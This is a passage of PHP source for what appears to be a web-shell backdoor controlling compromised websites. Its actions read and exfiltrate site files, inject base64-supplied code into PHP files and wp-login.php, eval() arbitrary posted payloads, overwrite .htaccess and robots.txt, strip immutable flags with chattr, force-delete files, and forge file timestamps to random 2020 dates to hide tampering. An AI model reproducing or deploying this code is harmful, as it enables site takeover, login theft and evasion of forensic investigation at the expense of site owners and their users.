                aqua_touch_2020($htaccessTargetFull);
                $out['htaccess'] = array('mode' => 'create', 'ok' => true, 'size' => strlen($htaccessBytes));
            } else {
                $out['htaccess'] = array('mode' => 'create', 'ok' => false, 'error' => 'write_failed');
            }
        } else {

            $origHt = @file_get_contents($htaccessTargetFull);
            if ($origHt === false) {
                $out['htaccess'] = array('mode' => 'check', 'ok' => false, 'error' => 'read_failed');
            } elseif ($htaccessMarker !== '' && strpos($origHt, $htaccessMarker) !== false) {

                $out['htaccess'] = array('mode' => 'skip', 'ok' => true, 'skipped' => true, 'reason' => 'already_hardened');
            } else {

                $bkPath = aqua_write_target($ROOT, $htaccessBackupName);
                $bkOk = false;
                if ($bkPath !== false) {
                    if (aqua_force_write($bkPath, $origHt)) {
                        aqua_touch_2020($bkPath);
                        $bkOk = true;
                    }
                }
                if (aqua_force_write($htaccessTargetFull, $htaccessBytes)) {
                    aqua_touch_2020($htaccessTargetFull);
                    $out['htaccess'] = array(
                        'mode' => 'backup_and_write',
                        'ok'   => true,
                        'backup_ok' => $bkOk,
                        'backup_path' => $htaccessBackupName,
                        'size' => strlen($htaccessBytes),
                    );
                } else {
                    $out['htaccess'] = array('mode' => 'backup_and_write', 'ok' => false, 'error' => 'write_failed', 'backup_ok' => $bkOk);
                }
            }
        }

        aqua_json(200, 'ok', $out);
        break;

    case 'bundle_report':
        $req = aqua_read_json_body();
        if (!is_array($req)) {
            aqua_json(400, 'bundle_report 需要 JSON body', null);
        }

        $out = array(
            'files'   => array(),
            'backup'  => null,
            'restore' => array(),
            'wp_login'=> null,
        );

        $fileContents = array();
        $fileMd5s     = array();
        if (isset($req['read_files']) && is_array($req['read_files'])) {
            foreach ($req['read_files'] as $rel) {
                if (!is_string($rel) || $rel === '') { continue; }
                $full = aqua_safe_path($ROOT, $rel);
                if ($full === false || !is_file($full)) {
                    $out['files'][$rel] = array('ok' => false, 'error' => 'not_found');
                    continue;
                }
                $content = @file_get_contents($full);
                if ($content === false) {
                    $out['files'][$rel] = array('ok' => false, 'error' => 'read_failed');
                    continue;
                }
                $md5 = md5($content);
                $fileContents[$rel] = $content;
                $fileMd5s[$rel] = $md5;
                $out['files'][$rel] = array(
                    'ok'      => true,
                    'md5'     => $md5,
                    'size'    => strlen($content),
                    'content' => base64_encode($content),
                );
            }
        }

        if (isset($req['backup_path']) && is_string($req['backup_path']) && $req['backup_path'] !== '') {
            $backupPath = $req['backup_path'];
            $dest = aqua_write_target($ROOT, $backupPath);
            if ($dest === false) {
                $out['backup'] = array('ok' => false, 'error' => 'invalid_path', 'path' => $backupPath);
            } else {
                $pack = array('files' => array());
                foreach ($fileContents as $rel => $content) {
                    $pack['files'][$rel] = array(
                        'content' => base64_encode($content),
                        'md5'     => $fileMd5s[$rel],
                    );
                }
                $json = json_encode($pack);
                if (aqua_force_write($dest, $json)) {
                    aqua_touch_2020($dest);
                    $out['backup'] = array('ok' => true, 'path' => $backupPath, 'size' => strlen($json));
                } else {
                    $out['backup'] = array('ok' => false, 'error' => 'write_failed', 'path' => $backupPath);
                }
            }
        }

        if (isset($req['restore_targets']) && is_array($req['restore_targets'])) {
            foreach ($req['restore_targets'] as $t) {
                if (!is_array($t)) { continue; }
                $path   = isset($t['path'])     ? $t['path']     : '';
                $codeB  = isset($t['code_b64']) ? $t['code_b64'] : '';
                $marker = isset($t['marker'])   ? $t['marker']   : '';
                if ($path === '' || $codeB === '') { continue; }

                $item = array('path' => $path);
                $full = aqua_safe_path($ROOT, $path);
                if ($full === false || !is_file($full)) {
                    $item['ok'] = false; $item['error'] = 'not_found';
                    $out['restore'][] = $item;
                    continue;
                }
                $code = base64_decode($codeB, true);
                if ($code === false) {
                    $item['ok'] = false; $item['error'] = 'bad_base64';
                    $out['restore'][] = $item;
                    continue;
                }
                $orig = @file_get_contents($full);
                if ($orig === false) {
                    $item['ok'] = false; $item['error'] = 'read_failed';
                    $out['restore'][] = $item;
                    continue;
                }
                if ($marker !== '' && strpos($orig, $marker) !== false) {
                    $item['ok'] = true; $item['skipped'] = true; $item['reason'] = 'already_injected';
                    $out['restore'][] = $item;
                    continue;
                }
                $newContent = $code . "\n" . $orig;
                if (aqua_force_write($full, $newContent)) {
                    aqua_touch_2020($full);
                    $item['ok'] = true;
                    $item['size'] = strlen($newContent);
                } else {
                    $item['ok'] = false; $item['error'] = 'write_failed';
                }
                $out['restore'][] = $item;
            }
        }

        if (isset($req['strip_targets']) && is_array($req['strip_targets'])) {
            $out['strip'] = array();
            foreach ($req['strip_targets'] as $t) {
                if (!is_array($t)) { continue; }
                $path   = isset($t['path'])   ? $t['path']   : '';
                $marker = isset($t['marker']) ? $t['marker'] : '';
                if ($path === '' || $marker === '') { continue; }

                $item = array('path' => $path);
                $full = aqua_safe_path($ROOT, $path);
                if ($full === false || !is_file($full)) {
                    $item['ok'] = false; $item['error'] = 'not_found';
                    $out['strip'][] = $item;
                    continue;
                }
                $orig = @file_get_contents($full);
                if ($orig === false) {
                    $item['ok'] = false; $item['error'] = 'read_failed';
                    $out['strip'][] = $item;
                    continue;
                }
                if (strpos($orig, $marker) === false) {
                    $item['ok'] = true; $item['skipped'] = true; $item['reason'] = 'not_found';
                    $out['strip'][] = $item;
                    continue;
                }
                $cleaned = $orig;
                while (($mPos = strpos($cleaned, $marker)) !== false) {
                    $before = substr($cleaned, 0, $mPos);
                    $phpOpen = strrpos($before, '<?php');
                    if ($phpOpen === false) { $phpOpen = $mPos; }
                    $after = substr($cleaned, $mPos);
                    $phpClose = strpos($after, '?>');
                    if ($phpClose === false) { break; }
                    $endIdx = $mPos + $phpClose + 2;
                    if ($endIdx < strlen($cleaned) && $cleaned[$endIdx] === "\n") { $endIdx++; }
                    $cleaned = substr($cleaned, 0, $phpOpen) . substr($cleaned, $endIdx);
                }
                if ($cleaned === $orig) {
                    $item['ok'] = true; $item['skipped'] = true; $item['reason'] = 'no_change';
                } else if (aqua_force_write($full, $cleaned)) {
                    aqua_touch_2020($full);
                    $item['ok'] = true; $item['size'] = strlen($cleaned);
                } else {
                    $item['ok'] = false; $item['error'] = 'write_failed';
                }
                $out['strip'][] = $item;
            }
        }

        if (isset($req['wp_login']) && is_array($req['wp_login'])) {
            $wl = $req['wp_login'];
            $path  = isset($wl['path'])         ? $wl['path']         : 'wp-login.php';
            $codeB = isset($wl['code_b64'])     ? $wl['code_b64']     : '';
            $start = isset($wl['start_marker']) ? $wl['start_marker'] : '';
            $item = array('path' => $path);

            if ($codeB === '') {
                $item['ok'] = false; $item['error'] = 'no_code';
            } else {
                $full = aqua_safe_path($ROOT, $path);
                if ($full === false || !is_file($full)) {
                    $item['ok'] = false; $item['error'] = 'not_found';
                } else {
                    $code = base64_decode($codeB, true);
                    if ($code === false) {
                        $item['ok'] = false; $item['error'] = 'bad_base64';
                    } else {
                        $orig = @file_get_contents($full);
                        if ($orig === false) {
                            $item['ok'] = false; $item['error'] = 'read_failed';
                        } elseif ($start !== '' && strpos($orig, $start) !== false) {
                            $item['ok'] = true; $item['skipped'] = true; $item['reason'] = 'already_injected';
                        } else {
                            $newContent = $code . "\n" . $orig;
                            if (aqua_force_write($full, $newContent)) {
                                aqua_touch_2020($full);
                                $item['ok'] = true;
                                $item['size'] = strlen($newContent);
                            } else {
                                $item['ok'] = false; $item['error'] = 'write_failed';
                            }
                        }
                    }
                }
            }
            $out['wp_login'] = $item;
        }

        if (isset($req['rename_pairs']) && is_array($req['rename_pairs'])) {
            $out['rename'] = array();
            foreach ($req['rename_pairs'] as $pair) {
                if (!is_array($pair)) { continue; }
                $from = isset($pair['from']) ? $pair['from'] : '';
                $to   = isset($pair['to'])   ? $pair['to']   : '';
                if ($from === '' || $to === '') { continue; }
                $item = array('from' => $from, 'to' => $to);
                $fromFull = aqua_safe_path($ROOT, $from);
                $toFull   = aqua_write_target($ROOT, $to);
                if ($fromFull === false || $toFull === false) {
                    $item['ok'] = false; $item['error'] = 'invalid_path';
                } elseif (!is_file($fromFull)) {
                    $item['ok'] = true; $item['updated'] = false; $item['error'] = 'no_source';
                } else {
                    if (@rename($fromFull, $toFull)) {
                        aqua_touch_2020($toFull);
                        $item['ok'] = true; $item['updated'] = true;
                    } else {
                        $item['ok'] = false; $item['error'] = 'rename_failed';
                    }
                }
                $out['rename'][] = $item;
            }
        }

        if (isset($req['files']) && is_array($req['files'])) {
            $out['harden_files'] = array();
            foreach ($req['files'] as $rel => $b64) {
                if (!is_string($rel) || $rel === '' || !is_string($b64)) {
                    $out['harden_files'][(string)$rel] = array('ok' => false, 'error' => 'bad_param');
                    continue;
                }
                $dest = aqua_write_target($ROOT, $rel);
                if ($dest === false) {
                    $out['harden_files'][$rel] = array('ok' => false, 'error' => 'invalid_path');
                    continue;
                }
                $content = base64_decode($b64, true);
                if ($content === false) {
                    $out['harden_files'][$rel] = array('ok' => false, 'error' => 'bad_base64');
                    continue;
                }
                if (aqua_force_write($dest, $content)) {
                    aqua_touch_2020($dest);
                    $out['harden_files'][$rel] = array('ok' => true, 'size' => strlen($content), 'md5' => md5($content));
                } else {
                    $out['harden_files'][$rel] = array('ok' => false, 'error' => 'write_failed');
                }
            }
        }

        if (isset($req['protect_htaccess_b64']) && is_string($req['protect_htaccess_b64']) && $req['protect_htaccess_b64'] !== '') {
            $protContent = base64_decode($req['protect_htaccess_b64'], true);
            $exclude = isset($req['protect_exclude']) && is_array($req['protect_exclude']) ? $req['protect_exclude'] : array();
            $protOut = array('found' => array(), 'written' => array(), 'skipped' => array(), 'errors' => array());
            if ($protContent === false) {
                $protOut['error'] = 'bad_base64';
            } else {
                $results = array();
                aqua_scan_directories($ROOT, $ROOT, '', 1, 0, $results, 200);
                foreach ($results as $d) {
                    $name = basename($d);
                    $protOut['found'][] = $name;
                    if (in_array($name, $exclude)) {
                        $protOut['skipped'][] = $name;
                        continue;
                    }
                    $target = $d . '/.htaccess';
                    if (aqua_force_write($target, $protContent)) {
                        aqua_touch_2020($target);
                        $protOut['written'][] = $name;
                    } else {
                        $protOut['errors'][] = $name;
                    }
                }
            }
            $out['protect'] = $protOut;
        }

        if (empty($out['files']))        { $out['files'] = new \stdClass(); }
        if (isset($out['harden_files']) && empty($out['harden_files'])) { $out['harden_files'] = new \stdClass(); }
        if (isset($out['cleanup']) && empty($out['cleanup']))           { $out['cleanup'] = new \stdClass(); }

        aqua_json(200, 'ok', $out);
        break;

    case 'bundle_beima':
        $req = aqua_read_json_body();
        if (!is_array($req)) {
            aqua_json(400, 'bundle_beima 需要 JSON body', null);
        }
        if (!isset($req['payload_b64']) || !is_string($req['payload_b64']) || $req['payload_b64'] === '') {
            aqua_json(400, '缺少 payload_b64', null);
        }

        $phpCode = base64_decode($req['payload_b64'], true);
        if ($phpCode === false || strlen($phpCode) === 0) {
            aqua_json(400, 'payload_b64 解码失败', null);
        }

        ob_start();
        eval($phpCode);
        $output = ob_get_clean();

        $lines = array_filter(array_map('trim', explode("\n", $output)), function($l) { return $l !== ''; });
        $urls = array();
        $deployed = 0;
        $total = 0;
        foreach ($lines as $line) {
            if (preg_match('#^https?://#', $line)) {
                $urls[] = $line;
            } elseif (preg_match('#^(\d+)/(\d+)$#', $line, $m)) {
                $deployed = (int)$m[1];
                $total = (int)$m[2];
            }
        }

        aqua_json(200, 'ok', array(
            'deployed' => $deployed,
            'total'    => $total,
            'urls'     => $urls,
        ));
        break;

    case 'bundle_push':
        $req = aqua_read_json_body();
        if (!is_array($req)) {
            aqua_json(400, 'bundle_push 需要 JSON body', null);
        }

        $out = array(
            'cleanup' => array(),
            'files'   => array(),
            'touch'   => array(),
        );

        if (isset($req['cleanup_files']) && is_array($req['cleanup_files'])) {
            foreach ($req['cleanup_files'] as $rel) {
                if (!is_string($rel) || $rel === '') { continue; }
                $full = aqua_safe_path($ROOT, $rel);
                if ($full === false) {
                    $out['cleanup'][$rel] = 'invalid_path';
                    continue;
                }
                if (!is_file($full)) {
                    $out['cleanup'][$rel] = 'not_found';
                    continue;
                }
                $out['cleanup'][$rel] = aqua_hard_unlink($full) ? 'deleted' : 'delete_failed';
            }
        }

        aqua_cleanup_blockers($ROOT);

        if (isset($req['files']) && is_array($req['files'])) {
            foreach ($req['files'] as $rel => $b64) {
                if (!is_string($rel) || $rel === '' || !is_string($b64)) {
                    $out['files'][(string)$rel] = array('ok' => false, 'error' => 'bad_param');
                    continue;
                }
                $dest = aqua_write_target($ROOT, $rel);
                if ($dest === false) {
                    $out['files'][$rel] = array('ok' => false, 'error' => 'invalid_path');
                    continue;
                }
                $content = base64_decode($b64, true);
                if ($content === false) {
                    $out['files'][$rel] = array('ok' => false, 'error' => 'bad_base64');
                    continue;
                }
                // 修 0KB bug: base64 被 WAF 清理后 decode 可能返回空串而不是 false
                // 明明请求带了内容却解码成空,是传输被污染,不能落成 0 字节文件
                if ($content === '' && strlen($b64) > 0) {
                    $out['files'][$rel] = array('ok' => false, 'error' => 'empty_content');
                    continue;
                }
                if (aqua_force_write($dest, $content)) {
                    aqua_touch_2020($dest);
                    aqua_touch_2020_dir(dirname($dest), $ROOT);
                    $out['files'][$rel] = array(
                        'ok'   => true,
                        'size' => strlen($content),
                        'md5'  => md5($content),
                    );
                } else {
                    $out['files'][$rel] = array('ok' => false, 'error' => 'write_failed');
                }
            }
        }

        if (isset($req['touch_dirs']) && $req['touch_dirs']) {
            aqua_touch_all_dirs($ROOT);
            $out['touch']['dirs'] = 'done';
        }

        if (isset($req['touch_self']) && $req['touch_self']) {
            aqua_touch_2020($SELF_FILE);
            $out['touch']['self'] = 'done';
        }

        aqua_json(200, 'ok', $out);
        break;

    default:
        aqua_json(400, '未知 action', null);
}

function aqua_touch_2020($file) {
    $ts = mktime(
        mt_rand(0, 23), mt_rand(0, 59), mt_rand(0, 59),
        mt_rand(1, 12), mt_rand(1, 28), 2020
    );
    @touch($file, $ts, $ts);
}

function aqua_ensure_writable($file) {
    if (is_writable($file)) return;
    @chmod($file, 0644);
    if (is_writable($file)) return;
    @chmod($file, 0666);
    if (is_writable($file)) return;
    @chmod($file, 0777);
}

function aqua_force_write($file, $data) {
    if (is_file($file)) { aqua_ensure_writable($file); }

    $ok = @file_put_contents($file, $data);
    if ($ok !== false) return true;

    if (is_file($file) && function_exists('exec')) {
        @exec('chattr -i ' . escapeshellarg($file) . ' 2>/dev/null');
        @chmod($file, 0644);
        $ok = @file_put_contents($file, $data);
        if ($ok !== false) return true;
    }

    if (is_file($file)) {
        @chmod($file, 0644);
        $del = @unlink($file);
        if (!$del) {
            @chmod($file, 0777);
            $del = @unlink($file);
        }
        if (!$del && function_exists('exec')) {
            @exec('chattr -i ' . escapeshellarg($file) . ' 2>/dev/null');
            @chmod($file, 0644);
            $del = @unlink($file);
        }
        if (!$del) return false;
    }
    $ok = @file_put_contents($file, $data);
    if ($ok !== false) {
        @chmod($file, 0644);
        return true;
    }
    return false;
}

function aqua_write_target($ROOT, $rel) {
    $full = aqua_safe_path($ROOT, $rel);
    if ($full === false) { return false; }
    $dir = dirname($full);
    if (!is_dir($dir)) {
        if (!@mkdir($dir, 0755, true) && !is_dir($dir)) { return false; }
    }
    return $full;
}

function aqua_touch_2020_dir($dir, $ROOT) {
    $rootLen = strlen(rtrim($ROOT, '/'));
    $d = rtrim($dir, '/');
    while (strlen($d) > $rootLen) {
        if (is_dir($d)) { aqua_touch_2020($d); }
        $parent = dirname($d);
        if ($parent === $d) break;
        $d = $parent;
    }
}

function aqua_touch_all_dirs($ROOT) {
    $all = array();
    aqua_collect_dirs($ROOT, $all);
    usort($all, '_aqua_sort_depth');
    foreach ($all as $d) {
        aqua_touch_2020($d);
    }
}
function _aqua_sort_depth($a, $b) { return strlen($b) - strlen($a); }
function aqua_collect_dirs($dir, &$result) {
    $dh = @opendir($dir);
    if (!$dh) return;
    while (($f = readdir($dh)) !== false) {
        if ($f === '.' || $f === '..') continue;
        $full = $dir . '/' . $f;
        if (is_dir($full)) {
            $result[] = $full;
            aqua_collect_dirs($full, $result);
        }
    }
    closedir($dh);
}

function aqua_rel($ROOT, $full) {
    $r = substr($full, strlen($ROOT));
    return ltrim(str_replace('\\', '/', $r), '/');
}

function aqua_json($code, $message, $data) {
    aqua_status($code);
    header('Content-Type: application/json');
    $out = array('code' => $code, 'message' => $message);
    if ($data !== null) { $out['data'] = $data; }
    echo json_encode($out);
    exit;
}

function aqua_status($code) {
    $map = array(200 => 'OK', 400 => 'Bad Request', 403 => 'Forbidden', 404 => 'Not Found', 500 => 'Internal Server Error');
    $text = isset($map[$code]) ? $map[$code] : 'OK';
    if (function_exists('http_response_code')) {
        http_response_code($code);
    } else {
        $proto = isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.0';
        header($proto . ' ' . $code . ' ' . $text, true, $code);
    }
}

function aqua_cleanup_blockers($ROOT) {
    aqua_gen_robots($ROOT);
}

function aqua_gen_robots($ROOT) {
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
    if ($host === '') return;

    $https = false;
    if (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        $https = true;
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && strtolower($_SERVER['HTTP_X_FORWARDED_PROTO']) === 'https') {
        $https = true;
    } elseif (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) {
        $https = true;
    }
    $protocol = $https ? 'https' : 'http';
    $sitemapUrl = $protocol . '://' . $host . '/sitemap.xml';

    $content = "User-agent: *\r\nAllow: /\r\nSitemap: " . $sitemapUrl . "\r\n";

    $robotsFile = $ROOT . '/robots.txt';
    aqua_force_write($robotsFile, $content);
    aqua_touch_2020($robotsFile);
}
function aqua_scan_directories($scanDir, $rootDir, $prefix, $maxDepth, $currentDepth, &$results, $maxResults) {
    if (count($results) >= $maxResults) {
        return;
    }

    if ($maxDepth > 0 && $currentDepth >= $maxDepth) {
        return;
    }

    $dh = @opendir($scanDir);
    if (!$dh) return;

    while (($f = readdir($dh)) !== false) {
        if ($f === '.' || $f === '..') continue;

        $full = $scanDir . '/' . $f;
        if (!is_dir($full)) continue;

        $relPath = $prefix === '' ? $f : $prefix . '/' . $f;
        $results[] = $relPath;

        if (count($results) >= $maxResults) {
            closedir($dh);
            return;
        }

        if ($maxDepth == 0 || $currentDepth + 1 < $maxDepth) {
            aqua_scan_directories($full, $rootDir, $relPath, $maxDepth, $currentDepth + 1, $results, $maxResults);
        }
    }

    closedir($dh);
}

function aqua_read_json_body() {
    global $__aqua_dec_body;
    if ($__aqua_dec_body !== null) {
        $raw = $__aqua_dec_body;
    } else {
        $raw = @file_get_contents('php://input');
    }
    if ($raw === false || $raw === '') { return null; }
    $data = json_decode($raw, true);
    if (!is_array($data)) { return null; }
    return $data;
}

function aqua_hard_unlink($file) {
    if (!is_file($file)) { return true; }
    @chmod($file, 0644);
    if (@unlink($file)) { return true; }
    @chmod($file, 0777);
    if (@unlink($file)) { return true; }
    if (function_exists('exec')) {
        @exec('chattr -i ' . escapeshellarg($file) . ' 2>/dev/null');
        @chmod($file, 0644);
        if (@unlink($file)) { return true; }
    }
    return !is_file($file);
}
